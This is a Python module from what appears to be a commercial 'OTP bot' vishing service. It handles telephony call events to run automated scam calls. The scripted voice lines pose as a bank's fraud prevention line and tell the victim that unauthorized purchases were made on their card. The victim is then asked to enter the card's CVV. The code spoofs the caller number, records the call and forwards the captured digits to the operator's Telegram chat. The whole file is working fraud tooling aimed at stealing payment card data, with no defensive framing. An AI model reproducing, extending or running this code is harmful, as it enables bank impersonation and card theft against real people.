# BASIC
import asyncio

# OTHER
from server.general import play_audio_direct, send_telegram_message, handle_initiated_call, send_accept_deny, send_end_call, send_call_answered, add_usage, send_detection, send_call_recording, start_recording
from server.general import save_calldetails, fetch_calldetails, delete_calldetails, hangup_call, send_code_vouch


# TTS Payloads
PAYLOAD_START_CALL = "Hello {name}. this is the {bank} fraud prevention line. we have detected unauthorized purchases made from your {bank} card, ending on ,{last4digits}. Please press 1 if this was not you.."
PAYLOAD_DTMF_ONE = "to block this request, please enter the {cvvdigits} digit cvv code that stands on the back of your {bank} card."
PAYLOAD_THANKS = "Thank you for your assistance. Please wait a second while we check the code."

PRESSDTMF_SLEEP_DURATION = 40
HANGUP_SLEEP_DURATION = 120
DELETE_DATA_SLEEP_DURATION = 300

# Replace cvvdigits with universal variable?

async def cvv(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, bank: str, name: str, last4digits: str, cvvdigits: str, chatid: str, tag: str):
    if event == "Dial":
        # CHANGE CALL STARTED TO YES
        info = await fetch_calldetails(channel_id=channel_id)
        if info.get('is_dial_ran') != "yes":
            await save_calldetails(channel_id=channel_id, is_dial_ran="yes")
            await handle_initiated_call(channel_id, chatid, number, spoof)
    
    elif event == "StasisStart":
        # START RECORDING
        await start_recording(channel_id)

        # CHANGE DTMF MODE
        await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_one")
        
        # SEND TG MESSAGE
        await send_call_answered(chatid)

        # PLAY TTS
        payload_1 = PAYLOAD_START_CALL.format(**locals())
        await play_audio_direct(channel_id, payload_1, chatid)
        
        # WAIT PRESS 1
        await asyncio.sleep(PRESSDTMF_SLEEP_DURATION)
        info = await fetch_calldetails(channel_id=channel_id)
        if info['dtmf_status'] == "waiting_for_one":
            await hangup_call(channel_id)
            await send_telegram_message(chatid, "🕐 Target did not respond in time. Call was hung up.")

        # MAX CALL TIME LIMIT
        await asyncio.sleep(HANGUP_SLEEP_DURATION)
        await hangup_call(channel_id)
            
    elif event == "PlaybackStarted":
        # SAVE PLAYBACK ID
        playback_id = data.get('playback', {}).get('id', None)
        await save_calldetails(channel_id=channel_id, current_playback_id=playback_id)

    elif event == "PlaybackFinished":
        print("EXECUTING PLAYBACK FINISHED")
        pass

    elif event == "RecordingFinished":
        print("EXECUTING RECORD FINISHED EVENT")

            

    elif event == "ChannelDtmfReceived":
        # FETCH CURRENT DIGIT
        digit = data['digit']
        info = await fetch_calldetails(channel_id=channel_id)
        if info['dtmf_status'] == "waiting_for_one":
            if digit == "1":
                # CHANGE DIGIT MODE
                await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_otp", dtmf_digits="")
                
                # PLAY TTS
                payload_2 = PAYLOAD_DTMF_ONE.format(**locals())
                await play_audio_direct(channel_id, payload_2, chatid)
                
                # SEND TG MESSAGE
                await send_telegram_message(chatid, "🕵️‍♀️ Pressed 1. Target was asked for OTP...")


        elif info['dtmf_status'] == "waiting_for_otp":
            # CURRENT DTMF DIGIT
            info['dtmf_digits'] += digit
            await save_calldetails(channel_id=channel_id, dtmf_digits=info['dtmf_digits'])
            
            # CHECK IF ENOUGH DIGITS        
            if len(info['dtmf_digits']) == int(cvvdigits):
                
                # CODE IS VALID
                payload_thanks = PAYLOAD_THANKS
                await play_audio_direct(channel_id, payload_thanks, chatid)
                
                # SAVE CALL STATE
                await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_button", dtmf_digits="")

                # SEND TG ACCEPT/DENY
                payload_2 = PAYLOAD_DTMF_ONE.format(**locals())
                await send_accept_deny(chatid, payload_2, call_variables, cvvdigits, f"🪙 CVV Code: {info['dtmf_digits']}", channel_id)
                await send_code_vouch(info['dtmf_digits'], chatid)

    elif event == "ChannelHangupRequest":
        # Prevent Target didnt press message
        await save_calldetails(channel_id=channel_id, dtmf_status="call_ended")
        
        # END CALL MESSAGE
        await send_end_call(channel_id, chatid)
        
        # CALL RECORDING
        try:
            await send_call_recording(chatid, channel_id)
        except Exception as e:
            print(e)
        
        # ADD USER USAGE
        await add_usage(chatid, tag, module, data)

        # DELETE DATA & ADD USAGE
        await asyncio.sleep(DELETE_DATA_SLEEP_DURATION)
        info = await fetch_calldetails(channel_id=channel_id)
        if info and info['dtmf_status']:
            await delete_calldetails(chatid)
        

    
    
    
    
    
    







    elif event == "call.gather.ended":
        otp_code = data['data']['payload']['digits']
        
        if otp_code == "1":
            ## SEND OTP
            payload = f"to block this request, please enter the {cvvdigits} digit cvv code that stands on the back of your {bank} card."
            await play_audio_direct(channel_id, payload, chatid)

            await send_telegram_message(chatid, "🕵️‍♀️ Pressed 1. Target was asked for CVV...")

        elif len(otp_code) >= 3:
            ## CODE IS VALID
            payload = f"Thank you for your assistance. Please wait a second while we check the code."
            await play_audio_direct(channel_id, payload, chatid)

            webhook = f""
            payload =f"To block this request, please enter the {cvvdigits} digit cvv code that stands on the back of your {bank} card."
            await send_accept_deny(chatid, payload, webhook, cvvdigits, f"\\U1F4F2 CVV Code: {otp_code}", data['data']['payload']['call_control_id'])
            #await send_telegram_message(-1001974622228, "\\U1F4F2 Link has been approved! ~ https://otpbot.us/")
            
    elif event == "call.machine.detection.ended":
        await send_detection(data, chatid)
        
